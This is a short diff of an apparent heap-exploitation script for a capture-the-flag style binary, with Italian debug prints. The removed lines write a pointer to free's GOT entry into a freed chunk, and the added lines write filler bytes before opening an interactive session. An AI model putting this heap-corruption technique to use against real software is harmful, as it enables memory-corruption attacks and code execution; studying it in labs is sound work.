@@ -43,16 +43,9 @@ free(c2);
 
 print("free fatte")
 
-offset_free_got = 0x2e04
-
-input("wait before writing")
-write(c2, 0x10, p64(main_address+offset_free_got))
-
-print("stampa main address + offset_free_got:")
-print(hex(main_address+offset_free_got))
-print("Scrittura dell'indirizzo dell'arbitrary chunk fatta")
-
-
+input("wait")
+write(c1, 0x8, b"A"*8)
+print("write fatta")
 
 
 r.interactive()
